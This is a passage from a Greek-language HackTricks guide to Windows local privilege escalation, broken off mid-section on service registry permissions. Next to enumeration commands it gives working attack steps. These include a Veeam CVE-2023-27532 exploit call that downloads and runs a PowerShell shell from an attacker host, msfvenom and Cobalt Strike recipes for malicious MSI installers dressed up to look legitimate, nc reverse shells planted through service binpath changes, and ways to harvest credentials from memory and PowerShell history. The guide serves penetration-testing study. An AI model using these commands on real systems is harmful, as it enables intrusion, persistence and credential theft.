# Τοπική Ανύψωση Δικαιωμάτων στα Windows

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο εργαλείο για την αναζήτηση vectors τοπικής ανύψωσης δικαιωμάτων στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Αρχική Θεωρία για τα Windows

### Access Tokens

**Εάν δεν γνωρίζετε τι είναι τα Windows Access Tokens, διαβάστε την ακόλουθη σελίδα πριν συνεχίσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Δείτε την παρακάτω σελίδα για περισσότερες πληροφορίες σχετικά με ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Επίπεδα Ακεραιότητας

**Εάν δεν γνωρίζετε τι είναι τα επίπεδα ακεραιότητας στα Windows, θα πρέπει να διαβάσετε την ακόλουθη σελίδα πριν συνεχίσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Μηχανισμοί Ασφάλειας των Windows

Υπάρχουν διάφορα στοιχεία στα Windows που θα μπορούσαν να σας εμποδίσουν να αναγνωρίσετε το σύστημα, να εκτελέσετε εκτελέσιμα αρχεία ή ακόμη και να εντοπίσουν τις δραστηριότητές σας. Πρέπει να διαβάσετε την ακόλουθη σελίδα και να καταγράψετε όλους αυτούς τους μηχανισμούς άμυνας πριν ξεκινήσετε την αναγνώριση για ανύψωση δικαιωμάτων:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Διαδικασίες UIAccess που ξεκινούν μέσω του `RAiLaunchAdminProcess` μπορούν να καταχρηστούν για να φτάσουν σε High IL χωρίς προτροπές όταν οι έλεγχοι secure-path του AppInfo παρακάμπτονται. Δείτε τη σχετική ροή παράκαμψης UIAccess/Admin Protection εδώ:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## Πληροφορίες Συστήματος

### Αναγνώριση πληροφοριών έκδοσης

Ελέγξτε αν η έκδοση των Windows έχει κάποια γνωστή ευπάθεια (ελέγξτε επίσης τα εφαρμοσμένα patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Έκδοση Exploits

Αυτός ο [site](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμος για την αναζήτηση λεπτομερών πληροφοριών σχετικά με τις ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων έχει περισσότερες από 4.700 ευπάθειες ασφαλείας, δείχνοντας την **massive attack surface** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Το Winpeas έχει ενσωματωμένο το watson)_

**Τοπικά με πληροφορίες συστήματος**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Αποθετήρια Github με exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχουν κάποια credential/Juicy info αποθηκευμένα στις env variables;
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Ιστορικό
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript αρχεία

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Λεπτομερείς πληροφορίες για τις εκτελέσεις του PowerShell pipeline καταγράφονται, περιλαμβάνοντας τις εκτελεσθείσες εντολές, τις κλήσεις εντολών και τμήματα scripts. Ωστόσο, μπορεί να μην καταγράφονται πλήρως όλες οι λεπτομέρειες εκτέλεσης και τα αποτελέσματα εξόδου.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα "Transcript files" της τεκμηρίωσης, επιλέγοντας **"Module Logging"** αντί για **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Για να δείτε τα τελευταία 15 events από τα PowersShell logs μπορείτε να εκτελέσετε:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Καταγράφεται πλήρες αρχείο δραστηριότητας και το πλήρες περιεχόμενο της εκτέλεσης του script, εξασφαλίζοντας ότι κάθε μπλοκ κώδικα τεκμηριώνεται καθώς τρέχει. Η διαδικασία αυτή διατηρεί ένα ολοκληρωμένο audit trail για κάθε ενέργεια, πολύτιμο για forensics και την ανάλυση κακόβουλης συμπεριφοράς. Με την καταγραφή όλων των δραστηριοτήτων κατά το χρόνο εκτέλεσης παρέχονται λεπτομερείς πληροφορίες για τη διαδικασία.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Τα συμβάντα καταγραφής για το Script Block μπορούν να εντοπιστούν στο Windows Event Viewer στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα τελευταία 20 συμβάντα μπορείτε να χρησιμοποιήσετε:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ρυθμίσεις Διαδικτύου
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Μονάδες δίσκου
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Μπορείτε να παραβιάσετε το σύστημα εάν οι ενημερώσεις δεν ζητούνται με http**S** αλλά με http.

Ξεκινάτε ελέγχοντας αν το δίκτυο χρησιμοποιεί μη-SSL WSUS ενημέρωση εκτελώντας τα παρακάτω στο cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ή το ακόλουθο στο PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Εάν λάβετε μια απάντηση όπως μία από τις ακόλουθες:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Και αν `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ισούται με `1`.

Τότε, **είναι εκμεταλλεύσιμο.** Αν η τελευταία τιμή μητρώου ισούται με `0`, τότε η καταχώρηση WSUS θα αγνοηθεί.

Για να εκμεταλλευτείτε αυτή την ευπάθεια μπορείτε να χρησιμοποιήσετε εργαλεία όπως: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Αυτά είναι weaponized MiTM exploit scripts για να εγχύσουν 'fake' updates σε non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Στην ουσία, αυτό είναι το σφάλμα που εκμεταλλεύεται αυτό το bug:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια χρησιμοποιώντας το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (όταν απελευθερωθεί).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` εκθέτει μια localhost υπηρεσία στο **TCP/9401** που επεξεργάζεται μηνύματα ελεγχόμενα από attacker, επιτρέποντας αυθαίρετες εντολές ως **NT AUTHORITY\SYSTEM**.

- **Recon**: επιβεβαιώστε τον listener και την έκδοση, π.χ., `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: τοποθετήστε ένα PoC όπως `VeeamHax.exe` με τα απαιτούμενα Veeam DLLs στον ίδιο κατάλογο, και μετά ενεργοποιήστε ένα SYSTEM payload μέσω του τοπικού socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Η υπηρεσία εκτελεί την εντολή ως SYSTEM.
## KrbRelayUp

Υπάρχει μια ευπάθεια **local privilege escalation** σε περιβάλλοντα Windows **domain** υπό συγκεκριμένες συνθήκες. Αυτές οι συνθήκες περιλαμβάνουν περιβάλλοντα όπου **LDAP signing is not enforced,** χρήστες με self-rights που τους επιτρέπουν να διαμορφώσουν **Resource-Based Constrained Delegation (RBCD),** καθώς και τη δυνατότητα δημιουργίας computers από χρήστες εντός του domain. Είναι σημαντικό να σημειωθεί ότι αυτές οι **requirements** ικανοποιούνται με τις **default settings**.

Βρείτε το **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης, δείτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Αν** αυτές οι 2 καταχωρήσεις είναι **ενεργοποιημένες** (η τιμή είναι **0x1**), τότε χρήστες οποιουδήποτε επιπέδου προνομίων μπορούν να **εγκαταστήσουν** (εκτελούν) `*.msi` αρχεία ως NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Αν έχετε μια meterpreter συνεδρία μπορείτε να αυτοματοποιήσετε αυτήν την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το power-up για να δημιουργήσετε μέσα στον τρέχοντα κατάλογο ένα Windows MSI binary για να escalate privileges. Αυτό το script εξάγει έναν προκατασκευασμένο MSI installer που ζητά την προσθήκη user/group (οπότε θα χρειαστείτε GIU access):
```
Write-UserAddMSI
```
Απλώς εκτελέστε το δημιουργημένο binary για να escalate privileges.

### MSI Wrapper

Διαβάστε αυτόν τον οδηγό για να μάθετε πώς να δημιουργήσετε έναν MSI wrapper χρησιμοποιώντας αυτό το εργαλείο. Σημειώστε ότι μπορείτε να περιτυλίξετε ένα "**.bat**" αρχείο αν το **μόνο** που θέλετε είναι να **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Ανοίξτε το **Visual Studio**, επιλέξτε **Create a new project** και πληκτρολογήστε "installer" στο πλαίσιο αναζήτησης. Επιλέξτε το project **Setup Wizard** και κάντε κλικ στο **Next**.
- Δώστε στο project ένα όνομα, π.χ. **AlwaysPrivesc**, χρησιμοποιήστε **`C:\privesc`** για τη θέση, επιλέξτε **place solution and project in the same directory**, και κάντε κλικ στο **Create**.
- Συνεχίστε να πατάτε **Next** μέχρι να φτάσετε στο βήμα 3 από 4 (choose files to include). Κάντε κλικ στο **Add** και επιλέξτε το Beacon payload που μόλις δημιουργήσατε. Έπειτα κάντε κλικ στο **Finish**.
- Επισημάνετε το **AlwaysPrivesc** project στο **Solution Explorer** και στις **Properties**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
- Υπάρχουν και άλλες ιδιότητες που μπορείτε να αλλάξετε, όπως το **Author** και **Manufacturer**, οι οποίες μπορούν να κάνουν την εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
- Κάντε δεξί κλικ στο project και επιλέξτε **View > Custom Actions**.
- Κάντε δεξί κλικ στο **Install** και επιλέξτε **Add Custom Action**.
- Κάντε διπλό κλικ στο **Application Folder**, επιλέξτε το αρχείο **beacon.exe** και κάντε κλικ στο **OK**. Αυτό θα διασφαλίσει ότι το beacon payload θα εκτελεστεί μόλις τρέξει ο installer.
- Στις **Custom Action Properties**, αλλάξτε το **Run64Bit** σε **True**.
- Τέλος, **build it**.
- Εάν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιωθείτε ότι έχετε ορίσει την πλατφόρμα σε x64.

### MSI Installation

Για να εκτελέσετε την **installation** του κακόβουλου `.msi` αρχείου στο **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Για να εκμεταλλευτείτε αυτήν την ευπάθεια μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Αντιϊός και Ανιχνευτές

### Ρυθμίσεις Ελέγχου

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, οπότε πρέπει να προσέξετε
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, είναι χρήσιμο να ξέρουμε πού αποστέλλονται τα logs.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** έχει σχεδιαστεί για τη **διαχείριση των τοπικών κωδικών του Administrator**, εξασφαλίζοντας ότι κάθε κωδικός είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** σε υπολογιστές που είναι ενταγμένοι σε ένα domain. Αυτοί οι κωδικοί αποθηκεύονται με ασφάλεια στο Active Directory και μπορούν να προσπελαστούν μόνο από χρήστες στους οποίους έχουν παραχωρηθεί επαρκή δικαιώματα μέσω ACLs, επιτρέποντάς τους να δουν local admin passwords εφόσον είναι εξουσιοδοτημένοι.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Εάν είναι ενεργό, **οι plain-text passwords αποθηκεύονται στο LSASS** (Local Security Authority Subsystem Service).\
[**Περισσότερες πληροφορίες για το WDigest σε αυτή τη σελίδα**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Από τα **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για το Local Security Authority (LSA) ώστε να **αποτρέπει** προσπάθειες μη αξιόπιστων διεργασιών να **διαβάσουν τη μνήμη του** ή να εγχύσουν κώδικα, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**Περισσότερες πληροφορίες για την LSA Protection εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** εισήχθη στο **Windows 10**. Ο σκοπός του είναι να προστατεύει τα credentials που είναι αποθηκευμένα σε μια συσκευή από απειλές όπως pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Αποθηκευμένα Διαπιστευτήρια

**Διαπιστευτήρια domain** ελέγχονται από την **Τοπική Αρχή Ασφαλείας** (LSA) και χρησιμοποιούνται από συστατικά του λειτουργικού συστήματος. Όταν τα δεδομένα σύνδεσης ενός χρήστη επικυρώνονται από ένα καταχωρημένο πακέτο ασφάλειας, τα διαπιστευτήρια του domain για τον χρήστη συνήθως δημιουργούνται.\
[**Περισσότερες πληροφορίες για τα Αποθηκευμένα Διαπιστευτήρια εδώ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Χρήστες & Ομάδες

### Απαρίθμηση Χρηστών & Ομάδων

Πρέπει να ελέγξετε αν κάποια από τις ομάδες στις οποίες ανήκετε έχουν ενδιαφέροντα δικαιώματα
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ομάδες με προνόμια

If you **ανήκετε σε κάποια ομάδα με προνόμια, μπορεί να καταφέρετε να αυξήσετε τα προνόμιά σας**. Μάθετε για τις ομάδες με προνόμια και πώς να τις καταχραστείτε για να αποκτήσετε αυξημένα προνόμια εδώ:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Χειρισμός token

**Μάθετε περισσότερα** σχετικά με το τι είναι ένα **token** σε αυτή τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δείτε την ακόλουθη σελίδα για να **μάθετε για ενδιαφέροντα token** και πώς να τα καταχραστείτε:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Συνδεδεμένοι χρήστες / Συνεδρίες
```bash
qwinsta
klist sessions
```
### Φάκελοι χρήστη
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Πολιτική Κωδικών Πρόσβασης
```bash
net accounts
```
### Λήψη του περιεχομένου του πρόχειρου
```bash
powershell -command "Get-Clipboard"
```
## Εκτελούμενες Διαδικασίες

### Δικαιώματα Αρχείων και Φακέλων

Πρώτα απ' όλα, κατά την καταγραφή των διεργασιών **check for passwords inside the command line of the process**.\
Ελέγξτε αν μπορείτε **overwrite some binary running** ή αν έχετε write permissions στον φάκελο του binary για να εκμεταλλευτείτε πιθανές [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Να ελέγχετε πάντα για πιθανούς [**electron/cef/chromium debuggers** που τρέχουν, μπορείτε να τα καταχραστείτε για to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Έλεγχος δικαιωμάτων των εκτελέσιμων αρχείων των διεργασιών**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Έλεγχος δικαιωμάτων των φακέλων των εκτελέσιμων αρχείων των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Εξαγωγή κωδικών από μνήμη

Μπορείτε να δημιουργήσετε ένα memory dump μιας διεργασίας σε εκτέλεση χρησιμοποιώντας **procdump** από sysinternals. Υπηρεσίες όπως FTP έχουν τα **credentials in clear text in memory**, δοκιμάστε να κάνετε dump της μνήμης και να διαβάσετε τα credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Ανασφαλείς εφαρμογές GUI

**Εφαρμογές που τρέχουν ως SYSTEM μπορεί να επιτρέπουν σε έναν χρήστη να εκκινήσει ένα CMD, ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: "Windows Help and Support" (Windows + F1), αναζητήστε "command prompt", κάντε κλικ στο "Click to open Command Prompt"

## Υπηρεσίες

Τα Service Triggers επιτρέπουν στα Windows να ξεκινούν μια υπηρεσία όταν συμβούν ορισμένες συνθήκες (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, κ.λπ.). Ακόμη και χωρίς δικαιώματα SERVICE_START συχνά μπορείτε να ξεκινήσετε προνομιούχες υπηρεσίες ενεργοποιώντας τα triggers τους. Δείτε τεχνικές αναγνώρισης και ενεργοποίησης εδώ:

-
{{#ref}}
service-triggers.md
{{#endref}}

Πάρτε μια λίστα υπηρεσιών:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε **sc** για να λάβετε πληροφορίες για μια υπηρεσία
```bash
sc qc <service_name>
```
Συνιστάται να έχετε το binary **accesschk** από το _Sysinternals_ για να ελέγξετε το απαιτούμενο επίπεδο προνομίων για κάθε υπηρεσία.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Συνιστάται να ελέγξετε αν οι "Authenticated Users" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Εάν αντιμετωπίζετε αυτό το σφάλμα (για παράδειγμα με SSDPSRV):

_Παρουσιάστηκε σφάλμα συστήματος 1058._\
_Η υπηρεσία δεν μπορεί να ξεκινήσει, είτε επειδή είναι απενεργοποιημένη είτε επειδή δεν έχει συνδεδεμένες ενεργές συσκευές._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από το SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη παράκαμψη** αυτού του προβλήματος είναι να εκτελέσετε:
```
sc.exe config usosvc start= auto
```
### **Τροποποίηση διαδρομής εκτελέσιμου της υπηρεσίας**

Στην περίπτωση όπου η ομάδα "Authenticated users" κατέχει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου αρχείου της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε το **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Επανεκκίνηση υπηρεσίας
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Τα προνόμια μπορούν να αυξηθούν μέσω διάφορων δικαιωμάτων:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την επαναδιαμόρφωση του εκτελέσιμου αρχείου της υπηρεσίας.
- **WRITE_DAC**: Επιτρέπει την επαναδιαμόρφωση δικαιωμάτων, δίνοντας τη δυνατότητα αλλαγής ρυθμίσεων υπηρεσίας.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση ιδιοκτησίας και την επαναδιαμόρφωση δικαιωμάτων.
- **GENERIC_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής ρυθμίσεων υπηρεσίας.
- **GENERIC_ALL**: Επίσης κληρονομεί τη δυνατότητα αλλαγής ρυθμίσεων υπηρεσίας.

Για τον εντοπισμό και την εκμετάλλευση αυτής της ευπάθειας, μπορεί να χρησιμοποιηθεί το _exploit/windows/local/service_permissions_.

### Αδύναμα δικαιώματα στα εκτελέσιμα αρχεία υπηρεσιών

**Ελέγξτε αν μπορείτε να τροποποιήσετε το εκτελέσιμο αρχείο που εκτελείται από μια υπηρεσία** ή αν έχετε **δικαιώματα εγγραφής στον φάκελο** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείτε να λάβετε κάθε binary που εκτελείται από μια υπηρεσία χρησιμοποιώντας **wmic** (όχι στο system32) και να ελέγξετε τα δικαιώματά σας με **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Μπορείτε επίσης να χρησιμοποιήσετε **sc** και **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Δικαιώματα τροποποίησης μητρώου υπηρεσιών

Πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε κάποιο μητρώο υπηρεσιών.\
